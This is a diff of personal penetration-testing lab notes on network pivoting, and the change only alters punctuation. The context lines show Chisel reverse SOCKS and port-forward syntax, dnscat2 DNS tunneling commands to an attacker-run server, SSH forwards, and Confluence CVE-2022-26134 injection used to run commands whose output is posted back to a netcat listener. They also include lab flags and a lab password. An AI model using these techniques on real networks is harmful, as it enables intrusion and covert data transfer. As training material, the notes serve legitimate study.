@@ -56,8 +56,8 @@ Chisel uses client/server model. The server binds a listening port. With `--reve
 > 🔁 Similar to: [[Port Redirection and SSH Tunneling#SSH Remote Dynamic Port Forwarding|SSH remote dynamic forwarding]] but over HTTP instead of raw SSH.
 
 **External resources:**
-- [HackTricks: Tunneling and Port Forwarding (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/generic-methodologies-and-resources/tunneling-and-port-forwarding.md) — Chisel section covers reverse SOCKS and specific port forward syntax
-- [PayloadsAllTheThings: Network Pivoting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md) — Chisel examples including R:socks and R:port variants
+- [HackTricks: Tunneling and Port Forwarding (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/generic-methodologies-and-resources/tunneling-and-port-forwarding.md). Chisel section covers reverse SOCKS and specific port forward syntax
+- [PayloadsAllTheThings: Network Pivoting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md). Chisel examples including R:socks and R:port variants
 - ippsec.rocks → search "chisel" for HTB boxes that use HTTP tunneling in their solutions
 
 **Architecture once Chisel is running:**
@@ -225,20 +225,20 @@ Expected: full SSH prompt on PGDATABASE01.
 
 > 🔍 Worth remembering generally: `ProxyCommand` in SSH is how you route SSH through any proxy. The pattern `ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p` is the standard drop-in replacement when OpenBSD nc isn't available. Works with any SOCKS proxy (Chisel, SSH dynamic, Proxychains, etc.) at any port.
 
-> 🔍 Worth remembering generally: **Chisel specific port forward vs SOCKS.** `R:socks` creates a reverse SOCKS proxy (route anything through proxychains/ProxyCommand). `R:localport:rhost:rport` creates a single specific reverse port forward — use this when the exercise client hardcodes a port and you don't need general SOCKS routing. Lab Q2 used `R:4141:10.4.249.215:8008` to expose exactly one service.
+> 🔍 Worth remembering generally: **Chisel specific port forward vs SOCKS.** `R:socks` creates a reverse SOCKS proxy (route anything through proxychains/ProxyCommand). `R:localport:rhost:rport` creates a single specific reverse port forward, use this when the exercise client hardcodes a port and you don't need general SOCKS routing. Lab Q2 used `R:4141:10.4.249.215:8008` to expose exactly one service.
 
 > 📸 Screenshot: SSH session on PGDATABASE01 established via Chisel HTTP tunnel
 
 ---
 
-> ✅ **20.1.2 Lab Q1 (VM Group 1)** — Chisel reverse SOCKS proxy via CVE-2022-26134 Confluence injection. Used Go 1.19 compiled binary (v1.8.1) to avoid glibc 2.32/2.34 incompatibility with newer Kali chisel. SSH via `ncat ProxyCommand` through SOCKS on 127.0.0.1:1080. Flag on PGDATABASE01 at `/tmp/chisel_flag`.
+> ✅ **20.1.2 Lab Q1 (VM Group 1)**. Chisel reverse SOCKS proxy via CVE-2022-26134 Confluence injection. Used Go 1.19 compiled binary (v1.8.1) to avoid glibc 2.32/2.34 incompatibility with newer Kali chisel. SSH via `ncat ProxyCommand` through SOCKS on 127.0.0.1:1080. Flag on PGDATABASE01 at `/tmp/chisel_flag`.
 >
 > ```
 > whoami: database_admin
 > flag: OS{5e431637346c27e3327ba03c12cfd612}
 > ```
 
-> ✅ **20.1.2 Lab Q2 (VM Group 2)** — `chisel_exercise_client` hardcodes `127.0.0.1:4141`. Used `R:4141:10.4.249.215:8008` on the Chisel client (not R:socks) to bind 4141 on Kali loopback and forward to PGDATABASE01:8008 via CONFLUENCE01. Ran the client binary, got flag directly from the server response.
+> ✅ **20.1.2 Lab Q2 (VM Group 2)**, `chisel_exercise_client` hardcodes `127.0.0.1:4141`. Used `R:4141:10.4.249.215:8008` on the Chisel client (not R:socks) to bind 4141 on Kali loopback and forward to PGDATABASE01:8008 via CONFLUENCE01. Ran the client binary, got flag directly from the server response.
 >
 > ```
 > Flag: OS{90705586fec401574bb3530a61c21323}
@@ -351,7 +351,7 @@ sudo tcpdump -i ens192 udp port 53
 
 ---
 
-> ✅ **20.2.1 Lab Q1 (VM Group)** — Used CVE-2022-26134 Confluence injection + output-collection pattern to run `nslookup -type=txt give-me.cat-facts.internal 192.168.249.64` on CONFLUENCE01. Output POST'd back to `nc -lvnp 4444` on Kali. No need for a full pivot setup for a single DNS query.
+> ✅ **20.2.1 Lab Q1 (VM Group)**. Used CVE-2022-26134 Confluence injection + output-collection pattern to run `nslookup -type=txt give-me.cat-facts.internal 192.168.249.64` on CONFLUENCE01. Output POST'd back to `nc -lvnp 4444` on Kali. No need for a full pivot setup for a single DNS query.
 >
 > ```
 > give-me.cat-facts.internal    text = "OS{70d78c775d7cd54d353815bacea17625}"
@@ -366,8 +366,8 @@ dnscat2 builds a full two-way encrypted tunnel over DNS queries. The server runs
 > 🔁 Similar to: [[Pivoting, Tunneling, and Port Forwarding (HTB Supplementary)#PT.4 Dnscat2 DNS Tunneling|HTB PTF PT.4 Dnscat2]] for the setup commands. This section adds the port forwarding use case.
 
 **External resources:**
-- [HackTricks: DNS Tunneling (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/generic-methodologies-and-resources/exfiltration.md#dns-exfiltration) — DNS exfil/infil concepts and tool references
-- [PayloadsAllTheThings: Network Pivoting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md) — dnscat2 section
+- [HackTricks: DNS Tunneling (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/generic-methodologies-and-resources/exfiltration.md#dns-exfiltration). DNS exfil/infil concepts and tool references
+- [PayloadsAllTheThings: Network Pivoting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md), dnscat2 section
 - ippsec.rocks → search "dnscat2" for HTB walkthrough examples
 
 **dnscat2 architecture:**
@@ -442,7 +442,7 @@ The authentication string must match on both sides. If it does, no MITM is in th
 
 > 🔧 Technique: When running dnscat2 without a `--secret` pre-shared key, the authentication string is the verification. Compare client vs server output to confirm no tampering. Always use `--secret` in real engagements for proper authentication.
 
-> 🔧 Technique: **dnscat2 session timing — act immediately.** The client drops after ~20 unanswered DNS queries. Between the session appearing and running `window -i 1` + `listen`, you have seconds. Have the listen command ready to paste. If the session drops, re-run `./dnscat feline.corp` on the pivot host and repeat.
+> 🔧 Technique: **dnscat2 session timing, act immediately.** The client drops after ~20 unanswered DNS queries. Between the session appearing and running `window -i 1` + `listen`, you have seconds. Have the listen command ready to paste. If the session drops, re-run `./dnscat feline.corp` on the pivot host and repeat.
 
 > 🔧 Technique: **Bypassing systemd-resolved for dnscat2.** If the session keeps dropping with "server hasn't returned a valid response", bypass systemd-resolved (127.0.0.53) and query MULTISERVER03 directly using the full `--dns` flag syntax:
 > ```bash
@@ -517,7 +517,7 @@ This is not stealthy. But it works through environments where literally nothing 
 
 ---
 
-> ✅ **20.2.2 Lab Q1 (VM Group)** — dnscat2-server on FELINEAUTHORITY (kali / 7he_C4t_c0ntro11er, 192.168.249.7). dnscat2 client on PGDATABASE01 via Chisel SOCKS → SSH pivot. Exercise client hardcodes `127.0.0.1:4141`. Chain: `listen 0.0.0.0:4141 172.16.249.217:4646` in dnscat2 + `ssh -fNL 4141:127.0.0.1:4141 kali@192.168.249.7` to bring FELINEAUTHORITY's port to Kali's loopback. Key lessons: use `window -i 1` immediately when session appears, act fast before 20-attempt timeout; `--dns server=X,port=53,domain=Y` is the correct syntax for bypassing systemd-resolved.
+> ✅ **20.2.2 Lab Q1 (VM Group)**, dnscat2-server on FELINEAUTHORITY (kali / 7he_C4t_c0ntro11er, 192.168.249.7). dnscat2 client on PGDATABASE01 via Chisel SOCKS → SSH pivot. Exercise client hardcodes `127.0.0.1:4141`. Chain: `listen 0.0.0.0:4141 172.16.249.217:4646` in dnscat2 + `ssh -fNL 4141:127.0.0.1:4141 kali@192.168.249.7` to bring FELINEAUTHORITY's port to Kali's loopback. Key lessons: use `window -i 1` immediately when session appears, act fast before 20-attempt timeout; `--dns server=X,port=53,domain=Y` is the correct syntax for bypassing systemd-resolved.
 >
 > ```
 > Flag: OS{125ac2f5592f1cead3a544217bd6c905}
@@ -542,9 +542,9 @@ This is not stealthy. But it works through environments where literally nothing 
 
 ## Video Walkthroughs
 
-- **Chisel HTTP tunneling:** ippsec.rocks → search "chisel" — covered in HTB Dante, Offshore, and similar multi-host lab writeups
-- **DNS tunneling / dnscat2:** ippsec.rocks → search "dnscat" — less common in public boxes but appears in deep-pivot lab scenarios
-- **CVE-2022-26134 Confluence RCE (the pivot vector used here):** [ippsec search "confluence"](https://ippsec.rocks/?#confluence) — the injection technique appears in several 2022-era boxes
+- **Chisel HTTP tunneling:** ippsec.rocks → search "chisel", covered in HTB Dante, Offshore, and similar multi-host lab writeups
+- **DNS tunneling / dnscat2:** ippsec.rocks → search "dnscat", less common in public boxes but appears in deep-pivot lab scenarios
+- **CVE-2022-26134 Confluence RCE (the pivot vector used here):** [ippsec search "confluence"](https://ippsec.rocks/?#confluence), the injection technique appears in several 2022-era boxes
 
 ---
 
@@ -626,4 +626,4 @@ ssh -fNL 4141:127.0.0.1:4141 kali@192.168.249.7
 
 ---
 
-*Module 20 fully complete — theory, all four labs, solo enrichment pass done.*
+*Module 20 fully complete, theory, all four labs, solo enrichment pass done.*
